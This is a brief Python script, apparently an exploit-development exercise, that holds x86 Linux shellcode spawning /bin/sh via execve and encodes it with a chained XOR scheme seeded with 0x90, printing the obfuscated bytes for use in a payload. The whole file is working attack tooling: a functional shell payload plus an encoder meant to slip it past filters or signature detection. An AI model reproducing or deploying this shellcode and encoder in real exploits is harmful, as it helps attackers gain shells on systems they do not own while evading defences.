#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

out = []
out.append(0x90)

for i in range(0, len(shellcode)):
    b1 = ord(shellcode[i]) ^ out[i]
    out.append(b1)

print("\nOut Length: ")
print(str(len(out)))
print(", ".join(hex(c) for c in out[1::]))
